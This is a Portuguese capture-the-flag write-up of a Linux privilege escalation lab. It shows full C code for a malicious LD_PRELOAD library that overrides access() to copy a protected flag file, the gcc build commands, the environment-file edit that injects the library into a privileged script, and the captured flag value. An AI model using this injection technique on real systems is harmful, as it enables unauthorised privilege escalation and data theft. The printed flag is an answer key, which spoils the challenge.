# CTF #4 - Linux Environment 


## Identificação de vulnerabilidades

Primeiramente, começamos por recolher o máximo de informação possível sobre o sistema, de forma a tentar encontrar alguma vulnerabilidade.

O ficheiro **admin_note.txt** deu-nos uma dica que existe uma vulnerabilidade na tmp folder que nos permitiria chegar à flag. Além disso, depois de ler o ficheiro **main.c**, através do comando **cat**, descobrimos que, possivelmente, existe um ficheiro chamado ***flag.txt*** na folder flags.

``` 
cat main.c
```

Por fim, chegamos à conclusão que o script que corre regularmente no servidor tem mais privilégios que nós, por isso deduzimos que o script estaria relacionado com o ataque também.

Finalmente, tentamos aceder à flags folder, mas não tinhamos permissão.
Com estas informações, começamos a construir um plano com o propósito de, de alguma forma, conseguir root privileges e ter acesso ao ficheiro ***flags.txt***.


## Ataque


O ataque consiste em dar override à função **access()** da standard C library, presente no **main.c**, e fazer uma system call através da função **system()** onde usamos o comando **cat** para copiar o que está no ficheiro ***flag.txt*** para um ficheiro criado por nós.

Primeiro, começamos por criar um ficheiro `lib.c`, que terá o código da nossa malicious library:

```
cat > lib.c

#include <stdio.h>
#include <stdlib.h>

int access(const char *pathname, int mode) {
    system("/usr/bin/cat /flags/flag.txt > /tmp/text.txt");
       return 0;
}
```

O ficheiro `/tmp/text.txt` é um ficheiro temporário criado da seguinte forma :

```
touch text.txt
```

Este ficheiro irá conter o que estiver escrito no ficheiro `/flags/flag.txt`, que, em princípio, é a flag.

Depois disso, compilamos o `lib.c` de forma a torná-lo numa library com os seguintes comandos:

```
gcc -fPIC -g -c lib.c
```

E:

```
gcc -shared -o liblib.so.1.0.1 lib.o -lc
```

Por fim, temos que modificar o ficheiro `env` de forma a adicionar a library `liblib.so.1.0.1` à environment variable `LD_PRELOAD` desta forma:

``` 
cat > env
LD_PRELOAD=/tmp/liblib.so.1.0.1
```

Agora, basta esperar que o my_script.sh rode mais uma vez e a flag estará dentro do text.txt.

No nosso caso era `flag{90069b3c95cdd8df71e65ce0fd7ce815}`
